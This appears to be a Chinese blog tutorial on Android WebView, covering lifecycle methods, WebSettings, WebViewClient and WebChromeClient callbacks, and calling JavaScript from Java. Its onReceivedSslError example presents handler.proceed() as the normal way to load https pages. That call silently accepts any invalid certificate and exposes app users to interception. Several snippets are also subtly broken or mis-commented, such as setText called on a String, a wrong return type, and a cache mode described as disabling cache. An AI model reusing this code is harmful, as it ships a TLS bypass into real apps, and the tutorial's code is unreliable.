<h3 id="2-WebView使用详解"><a href="#2-WebView使用详解" class="headerlink" title="2.WebView使用详解"></a>2.WebView使用详解</h3><h4 id="（1）WebView常用方法"><a href="#（1）WebView常用方法" class="headerlink" title="（1）WebView常用方法"></a>（1）WebView常用方法</h4><p><strong>WebView的状态：</strong></p>
<p>webView.onResume();</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 激活WebView为活跃状态，能正常执行网页的响应</span><br></pre></td></tr></table></figure>

<p>webView.onPause();</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 当页面被失去焦点被切换到后台不可见状态，需要执行onPause</span><br><span class="line">// 通过onPause动作通知内核暂停所有的动作，比如DOM的解析、plugin的执行、JavaScript执行。</span><br></pre></td></tr></table></figure>

<p>webView.pauseTimers()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 当应用程序(存在webview)被切换到后台时，这个方法不仅仅针对当前的webview而是全局的全应用程序的webview</span><br><span class="line">// 它会暂停所有webview的layout，parsing，javascripttimer。降低CPU功耗。</span><br></pre></td></tr></table></figure>

<p>webView.resumeTimers()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 恢复pauseTimers状态</span><br></pre></td></tr></table></figure>

<p>rootLayout.removeView(webView)</p>
<p>webView.destory()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// webview调用destory时，webview仍绑定在Activity上</span><br><span class="line">// 需要先从父容器中移除webview，然后再销毁webview</span><br></pre></td></tr></table></figure>

<p><strong>前进、后退网页</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//是否可以后退</span></span><br><span class="line">Webview.canGoBack()</span><br><span class="line"></span><br><span class="line"><span class="comment">//后退网页</span></span><br><span class="line">Webview.goBack()</span><br><span class="line"></span><br><span class="line"><span class="comment">//是否可以前进</span></span><br><span class="line">Webview.canGoForward()</span><br><span class="line"></span><br><span class="line"><span class="comment">//前进网页</span></span><br><span class="line">Webview.goForward()</span><br><span class="line"></span><br><span class="line"><span class="comment">//以当前的index为起始点前进或者后退到历史记录中指定的steps</span></span><br><span class="line"><span class="comment">//如果steps为负数则为后退，正数则为前进</span></span><br><span class="line">Webview.goBackOrForward(intsteps)</span><br></pre></td></tr></table></figure>

<p>在不做任何处理前提下，浏览网页时点击系统的“Back”键时，整个 Browser 会调用 finish()而结束自身，因此需要在当前Activity中处理并消费掉该 Back 事件，当按下返回键时，调用goBack方法。</p>
<p>我们可以做一些处理，让点击“Back”键后，让网页返回上一页而不是直接退出浏览器，此时我们可以在当前的Activity中处理Back事件，如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onKeyDown</span><span class="params">(<span class="type">int</span> keyCode, KeyEvent event)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((keyCode == KEYCODE_BACK) &amp;&amp; mWebView.canGoBack()) &#123;</span><br><span class="line">         mWebView.goBack();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.onKeyDown(keyCode, event);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>清除缓存数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//清除网页访问留下的缓存</span><br><span class="line">//由于内核缓存是全局的因此这个方法不仅仅针对webview而是针对整个应用程序.</span><br><span class="line">Webview.clearCache(true);</span><br><span class="line"></span><br><span class="line">//清除当前webview访问的历史记录</span><br><span class="line">//只会webview访问历史记录里的所有记录除了当前访问记录</span><br><span class="line">Webview.clearHistory()；</span><br><span class="line"></span><br><span class="line">//这个api仅仅清除自动完成填充的表单数据，并不会清除WebView存储到本地的数据</span><br><span class="line">Webview.clearFormData()；</span><br></pre></td></tr></table></figure>

<h4 id="（2）常用类"><a href="#（2）常用类" class="headerlink" title="（2）常用类"></a>（2）常用类</h4><h5 id="lt-1-gt-WebSettings类"><a href="#lt-1-gt-WebSettings类" class="headerlink" title="&lt;1&gt;WebSettings类"></a><strong>&lt;1&gt;WebSettings类</strong></h5><p>作用：对WebView进行配置和管理</p>
<p>配置步骤：</p>
<p>第一步：添加访问网络权限（AndroidManifest.xml）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p>注意：从Android 9.0（API级别28）开始，默认情况下禁用明文支持，会显示 <code>ERR_CLEARTEXT_NOT_PERMITTED</code>。因此http的url均无法在webview中加载，可以在manifest中application节点添加<code>android:usesCleartextTraffic=&quot;true&quot;</code>。</p>
<p>第二步：生成一个WebView组件（有两种方式）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式1：直接在在Activity中生成</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(<span class="built_in">this</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法2：在Activity的layout文件里添加webview控件：</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> (WebView) findViewById(R.id.webView1);</span><br></pre></td></tr></table></figure>

<p>第三步：进行配置-利用WebSettings子类（常见方法）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明WebSettings子类</span></span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> webView.getSettings();</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果访问的页面中要与Javascript交互，则webview必须设置支持Javascript</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//支持插件</span></span><br><span class="line">webSettings.setPluginsEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//设置自适应屏幕，两者合用</span></span><br><span class="line">webSettings.setUseWideViewPort(<span class="literal">true</span>); <span class="comment">//将图片调整到适合webview的大小</span></span><br><span class="line">webSettings.setLoadWithOverviewMode(<span class="literal">true</span>); <span class="comment">// 缩放至屏幕的大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//缩放操作</span></span><br><span class="line">webSettings.setSupportZoom(<span class="literal">true</span>); <span class="comment">//支持缩放，默认为true。是下面那个的前提。</span></span><br><span class="line">webSettings.setBuiltInZoomControls(<span class="literal">true</span>); <span class="comment">//设置内置的缩放控件。若为false，则该WebView不可缩放</span></span><br><span class="line">webSettings.setDisplayZoomControls(<span class="literal">false</span>); <span class="comment">//隐藏原生的缩放控件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//其他细节操作</span></span><br><span class="line">webSettings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK); <span class="comment">//关闭webview中缓存</span></span><br><span class="line">webSettings.setAllowFileAccess(<span class="literal">true</span>); <span class="comment">//设置可以访问文件</span></span><br><span class="line">webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>); <span class="comment">//支持通过JS打开新窗口</span></span><br><span class="line">webSettings.setLoadsImagesAutomatically(<span class="literal">true</span>); <span class="comment">//支持自动加载图片</span></span><br><span class="line">webSettings.setDefaultTextEncodingName(<span class="string">&quot;utf-8&quot;</span>);<span class="comment">//设置编码格式</span></span><br></pre></td></tr></table></figure>

<p>常见方法：设置WebView缓存</p>
<ul>
<li>当加载 html 页面时，WebView会在&#x2F;data&#x2F;data&#x2F;包名目录下生成 database 与 cache 两个文件夹</li>
<li>请求的 URL记录保存在 WebViewCache.db，而 URL的内容是保存在 WebViewCache 文件夹下</li>
<li>是否启用缓存：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//优先使用缓存</span></span><br><span class="line">WebView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);</span><br><span class="line"></span><br><span class="line"><span class="comment">//缓存模式如下：</span></span><br><span class="line">    <span class="comment">//LOAD_CACHE_ONLY: 不使用网络，只读取本地缓存数据</span></span><br><span class="line">    <span class="comment">//LOAD_DEFAULT: （默认）根据cache-control决定是否从网络上取数据。</span></span><br><span class="line">    <span class="comment">//LOAD_NO_CACHE: 不使用缓存，只从网络获取数据.</span></span><br><span class="line">    <span class="comment">//LOAD_CACHE_ELSE_NETWORK，只要本地有，无论是否过期，或者no-cache，都使用缓存中的数据</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//不使用缓存</span></span><br><span class="line">WebView.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);</span><br></pre></td></tr></table></figure>

<h5 id="lt-2-gt-WebViewClient类"><a href="#lt-2-gt-WebViewClient类" class="headerlink" title="&lt;2&gt;WebViewClient类"></a><strong>&lt;2&gt;WebViewClient类</strong></h5><p>用来处理各种通知 &amp; 请求事件</p>
<p><strong>shouldOverrideUrlLoading()</strong></p>
<p>作用：打开网页时不调用系统浏览器， 而是在本WebView中显示；在网页上的所有加载都经过这个方法,这个函数我们可以做很多操作。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Webview控件</span></span><br><span class="line"><span class="type">Webview</span> <span class="variable">webview</span> <span class="operator">=</span> (WebView) findViewById(R.id.webView);</span><br><span class="line"></span><br><span class="line"><span class="comment">//加载一个网页</span></span><br><span class="line">webView.loadUrl(<span class="string">&quot;http://www.google.com/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写shouldOverrideUrlLoading()方法，使得打开网页时不调用系统浏览器， 而是在本WebView中显示</span></span><br><span class="line">webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">           view.loadUrl(url);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>onPageStarted()</strong></p>
<p>作用：开始载入页面调用的，我们可以设定一个loading的页面，告诉用户程序在等待网络响应。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">onPageStarted</span><span class="params">(WebView view, String url, Bitmap favicon)</span> &#123;</span><br><span class="line">        <span class="comment">//设定加载开始的操作</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure>

<p><strong>onLoadResource()</strong></p>
<p>作用：在加载页面资源时会调用，每一个资源（比如图片）的加载都会调用一次。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onLoadResource</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">         <span class="comment">//设定加载资源的操作</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p><strong>onReceivedError（）</strong></p>
<p>作用：加载页面的服务器出现错误时（如404）调用。</p>
<p>App里面使用webview控件的时候遇到了诸如404这类的错误的时候，若也显示浏览器里面的那种错误提示页面就显得很丑陋了，那么这个时候我们的app就需要加载一个本地的错误提示页面，即webview如何加载一个本地的页面</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//步骤1：写一个html文件（error_handle.html），用于出错时展示给用户看的提示页面</span></span><br><span class="line"><span class="comment">//步骤2：将该html文件放置到代码根目录的assets文件夹下</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//步骤3：复写WebViewClient的onRecievedError方法</span></span><br><span class="line"><span class="comment">//该方法传回了错误码，根据错误类型可以进行不同的错误分类处理</span></span><br><span class="line">    webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedError</span><span class="params">(WebView view, <span class="type">int</span> errorCode, String description, String failingUrl)</span>&#123;</span><br><span class="line"><span class="keyword">switch</span>(errorCode)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">case</span> HttpStatus.SC_NOT_FOUND:</span><br><span class="line">                    view.loadUrl(<span class="string">&quot;file:///android_assets/error_handle.html&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>onReceivedSslError()</strong></p>
<p>作用：处理https请求</p>
<p>webView默认是不处理https请求的，页面显示空白，需要进行如下设置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>() &#123;    </span><br><span class="line">        <span class="meta">@Override</span>    </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedSslError</span><span class="params">(WebView view, SslErrorHandler handler, SslError error)</span> &#123;    </span><br><span class="line">            handler.proceed();    <span class="comment">//表示等待证书响应</span></span><br><span class="line">        <span class="comment">// handler.cancel();      //表示挂起连接，为默认方式</span></span><br><span class="line">        <span class="comment">// handler.handleMessage(null);    //可做其他处理</span></span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;);    </span><br></pre></td></tr></table></figure>

<p><strong>c.WebChromeClient</strong></p>
<p>作用：辅助 WebView 处理 Javascript 的对话框,网站图标,网站标题等等。</p>
<p> <strong>onProgressChanged（）</strong></p>
<p>作用：获得网页的加载进度并显示</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">webview.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>()&#123;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onProgressChanged</span><span class="params">(WebView view, <span class="type">int</span> newProgress)</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (newProgress &lt; <span class="number">100</span>) &#123;</span><br><span class="line">              <span class="type">String</span> <span class="variable">progress</span> <span class="operator">=</span> newProgress + <span class="string">&quot;%&quot;</span>;</span><br><span class="line">              progress.setText(progress);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>

<p><strong>onReceivedTitle（）</strong></p>
<p>作用：获取Web页中的标题</p>
<p>每个网页的页面都有一个标题，比如<a href="http://www.baidu.com这个页面的标题即“百度一下，你就知道”，那么如何知道当前webview正在加载的页面的title并进行设置呢？">www.baidu.com这个页面的标题即“百度一下，你就知道”，那么如何知道当前webview正在加载的页面的title并进行设置呢？</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webview.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>()&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedTitle</span><span class="params">(WebView view, String title)</span> &#123;</span><br><span class="line">       titleview.setText(title)；</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="（3）WebView与JS的交互"><a href="#（3）WebView与JS的交互" class="headerlink" title="（3）WebView与JS的交互"></a>（3）WebView与JS的交互</h4><p>Android WebView与JS的交互：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/5.png" alt="image-20220726171737615"></p>
<h5 id="lt-1-gt-Android调用JS"><a href="#lt-1-gt-Android调用JS" class="headerlink" title="&lt;1&gt;Android调用JS"></a>&lt;1&gt;Android调用JS</h5><p><strong><code>WebView.loadUrl()</code></strong></p>
<p>首先，准备html文件，放到assets中</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">function</span> <span class="title function_">callJS</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="title function_">alert</span>(<span class="string">&quot;Android调用了JS的callJS方法&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Android调用JS方法测试<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/8.png" alt="image-20220729093637679"></p>
<p>然后在Java层中添加代码，进行调用JS文件以及JS中的方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line"> webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> <span class="comment">// 设置允许JS弹窗</span></span><br><span class="line"> webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 先载入JS代码</span></span><br><span class="line"> <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"> mWebView.loadUrl(<span class="string">&quot;file:///android_asset/AndroJs.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line"> button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">         <span class="comment">// 通过Handler发送消息</span></span><br><span class="line">         mWebView.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">                 <span class="comment">// 注意调用的JS方法名要对应上</span></span><br><span class="line">                 <span class="comment">// 调用javascript的callJS()方法</span></span><br><span class="line">                 mWebView.loadUrl(<span class="string">&quot;javascript:callJS()&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 由于设置了弹窗检验调用结果,所以需要支持js对话框</span></span><br><span class="line"> <span class="comment">// webview只是载体，内容的渲染需要使用webviewChromClient类去实现</span></span><br><span class="line"> <span class="comment">// 通过设置WebChromeClient对象处理JavaScript的对话框</span></span><br><span class="line"> <span class="comment">//设置响应js 的Alert()函数</span></span><br><span class="line"> mWebView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsAlert</span><span class="params">(WebView view, String url, String message, <span class="keyword">final</span> JsResult result)</span> &#123;</span><br><span class="line">         AlertDialog.<span class="type">Builder</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">         b.setTitle(<span class="string">&quot;Alert&quot;</span>);</span><br><span class="line">         b.setMessage(message);</span><br><span class="line">         b.setPositiveButton(android.R.string.ok, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> which)</span> &#123;</span><br><span class="line">                 result.confirm();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">         b.setCancelable(<span class="literal">false</span>);</span><br><span class="line">         b.create().show();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>效果演示：</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/9.png" alt="image-20220729093932401"></p>
<p>我们可以发现程序成功的加载了html文件，然后我们点击按钮去调用js中的方法</p>
<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/10.png" alt="image-20220729094015144"></p>
<p>这里就成功的通过loadUrl进行了调用</p>
<p><strong>特别注意：JS代码调用一定要在 <code>onPageFinished（）</code> 回调之后才能调用，否则不会调用</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onPageFinished()属于WebViewClient类的方法，主要在页面加载结束时调用</span><br></pre></td></tr></table></figure>

<p><strong>WebView.evaluateJavascript()</strong></p>
<p>优点：该方法比第一种方法效率更高、使用更简洁</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为该方法的执行不会使页面刷新，而第一种方法（loadUrl ）的执行则会。</span><br><span class="line">Android <span class="number">4.4</span> 后才可使用</span><br></pre></td></tr></table></figure>

<p>具体使用：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用evaluateJavascript来加载</span></span><br><span class="line">mWebView.evaluateJavascript(<span class="string">&quot;javascript:callJS()&quot;</span>, <span class="keyword">new</span> <span class="title class_">ValueCallback</span>&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceiveValue</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="comment">//此处为 js 返回的结果</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/11.png" alt="image-20220729094734817"></p>
<p>同样加载成功</p>
